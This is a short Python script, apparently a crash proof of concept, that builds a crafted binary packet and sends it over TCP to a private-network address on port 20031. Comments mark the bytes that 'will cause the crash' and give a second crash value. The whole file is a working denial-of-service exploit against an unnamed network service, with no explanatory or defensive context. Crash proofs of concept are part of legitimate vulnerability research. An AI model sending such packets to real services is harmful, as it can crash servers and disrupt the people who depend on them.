#!/usr/bin/python
import socket as so
from struct import *

server = "192.168.140.130"
port = 20031
d = "\x18\x00\x00\x00"  
d += "\x01" 

#d += "\xCB\x22\x77\xC9" # Another crash example
d += "\x18\xE8\xBE\xC8" # Will cause the crash
d += "\x0B\x00\x00\x00" + "AAAA" + "B" * 6  
d += "\x00" # null byte

##
# send it

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((server, port))
s.send(d)
s.close()
